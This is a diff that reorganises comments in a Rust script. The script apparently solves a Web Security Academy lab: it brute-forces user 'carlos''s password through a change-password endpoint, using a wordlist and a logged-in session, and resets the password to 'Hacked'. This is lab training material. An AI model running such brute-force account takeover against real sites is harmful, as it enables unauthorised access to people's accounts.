@@ -37,37 +37,55 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a2b007c03db344bcf9c841200a20099.web-security-academy.net"; // change this to the url of your lab
-    let client = build_client(); // This client will be used in every request
-    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap(); // read all password in one string
+    // change this to your lab URL
+    let url = "https://0a2b007c03db344bcf9c841200a20099.web-security-academy.net";
 
-    let start_time = time::Instant::now(); // capture the time before brute forcing
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // read all password in one big string
+    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap();
+
+    // capture the time before brute forcing
+    let start_time = time::Instant::now();
+
     println!(
         "{} {}..",
         "[#] Brute forcing password of".white().bold(),
         "carlos".green().bold()
     );
-    let new_password = "Hacked"; // change this to what you want
+
+    // set the new password
+    // change this to what you want
+    let new_password = "Hacked";
+
+    // get the number of passwords
     let passwords_count = passwords.lines().count();
+
+    // iterate over passwords and their indices
     for (index, password) in passwords.lines().enumerate() {
+        // try to make a successful login first
         if let Ok(login_res) = login(&client, &format!("{url}/login"), "wiener", "peter") {
-            // try to make a successful login first
             match login_res.status().as_u16() {
+                // if a redirect happened which means login succeeded
                 302 => {
-                    // login succeeded
-                    let session = extract_session_cookie(login_res); // get the valid session
+                    // extract session cookie
+                    let session = extract_session_cookie(login_res);
+
+                    // try to guess the current password based on change password functionality
                     let change_password = change_password(
-                        // try to guess the current password based on change password functionality
                         &client,
                         &format!("{url}/my-account/change-password"),
                         &session,
                         "carlos",
                         password,
-                        new_password, // chagne the current password to this one
+                        new_password,
                     );
+
+                    // if the request is successful
                     if let Ok(change_password_res) = change_password {
+                        // if the password is changed successfully
                         if change_password_res.status().as_u16() == 200 {
-                            // change password request succeeded
                             println!(
                                 "\n[#] {} => {}",
                                 password.blue().bold(),
